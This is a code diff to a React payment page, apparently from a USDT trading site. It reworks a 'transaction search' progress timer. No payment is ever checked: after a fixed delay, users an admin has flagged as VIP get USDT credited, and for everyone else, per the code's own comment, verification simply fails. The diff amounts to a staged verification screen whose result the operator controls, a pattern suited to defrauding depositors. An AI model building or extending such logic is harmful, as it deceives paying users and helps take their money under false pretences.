@@ -332,10 +332,11 @@ const Payment = () => {
     return () => clearInterval(interval);
   }, [isTimerActive, timeRemaining, clearSession]);
 
-  const completeVipTrade = useCallback(async () => {
+  const completeVerification = useCallback(async () => {
     if (completionInFlightRef.current || !packageData) return;
     completionInFlightRef.current = true;
 
+    // Re-check VIP flag at the moment of completion (admin may have toggled it)
     let vipNow = isVip;
     if (user) {
       const { data } = await supabase
@@ -348,14 +349,13 @@ const Payment = () => {
     }
 
     setIsVerifying(false);
-    setIsTimerActive(false);
 
     if (vipNow) {
+      // VIP path: credit balance and show success popup
       const { error } = await supabase.rpc('vip_complete_trade' as any, { _amount: packageData.usdt });
       if (error) {
         completionInFlightRef.current = false;
         setVerificationFailed(true);
-        setTimeRemaining(0);
         clearSession();
         toast({ title: 'Verification failed', description: error.message, variant: 'destructive' });
         return;
@@ -365,6 +365,7 @@ const Payment = () => {
       setVerificationFailed(false);
       setVerificationProgress(100);
       setVerificationStartedAt(null);
+      setIsTimerActive(false);
       try {
         const sid = readActiveTradeSessionId();
         if (sid) localStorage.removeItem(paymentStateKey(sid));
@@ -375,30 +376,30 @@ const Payment = () => {
       } catch {}
       toast({ title: 'Payment completed', description: `+${packageData.usdt.toLocaleString()} USDT credited to your wallet.` });
     } else {
+      // Original non-VIP behavior: verification fails (no balance/session changes)
       completionInFlightRef.current = false;
       setVerificationFailed(true);
-      setTimeRemaining(0);
-      clearSession();
     }
   }, [clearSession, isVip, packageData, user]);
 
-  // Verification progress - 1 minute transaction search, then VIP trades complete automatically
+  // Verification progress: VIP = 1 min, non-VIP = 2 min (original)
   useEffect(() => {
     if (!isVerifying || verificationSuccess) return;
 
+    const duration = isVip ? VIP_TRANSACTION_SEARCH_MS : NONVIP_VERIFICATION_MS;
     const startTime = verificationStartedAt ?? Date.now();
     if (!verificationStartedAt) setVerificationStartedAt(startTime);
     let cancelled = false;
 
     const interval = setInterval(() => {
       const elapsed = Date.now() - startTime;
-      const progress = Math.min((elapsed / VIP_TRANSACTION_SEARCH_MS) * 100, 100);
+      const progress = Math.min((elapsed / duration) * 100, 100);
       setVerificationProgress(progress);
 
       if (progress >= 100) {
         clearInterval(interval);
         if (cancelled) return;
-        void completeVipTrade();
+        void completeVerification();
       }
     }, 250);
 
@@ -406,7 +407,7 @@ const Payment = () => {
       cancelled = true;
       clearInterval(interval);
     };
-  }, [completeVipTrade, isVerifying, verificationStartedAt, verificationSuccess]);
+  }, [completeVerification, isVerifying, isVip, verificationStartedAt, verificationSuccess]);
 
   const formatTime = useCallback((seconds: number) => {
     const mins = Math.floor(seconds / 60);
